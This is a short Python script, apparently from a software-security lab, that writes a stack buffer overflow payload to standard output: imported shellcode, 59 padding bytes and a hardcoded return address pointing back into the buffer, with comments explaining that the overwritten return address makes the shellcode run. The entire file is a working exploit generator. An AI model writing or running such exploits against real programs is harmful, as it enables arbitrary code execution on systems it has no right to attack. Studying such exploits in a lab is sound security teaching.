import sys
from struct import pack
from shellcode import shellcode
nops = b'a'*59
# Start of buffer
# this code overflows the buffer and overwrites the return address, which is the address of the buffer
# and the shellcode is inserted into the buffer and executed
addr = pack("<I", 0xfff6c0e0)
sys.stdout.buffer.write(shellcode+nops+addr)
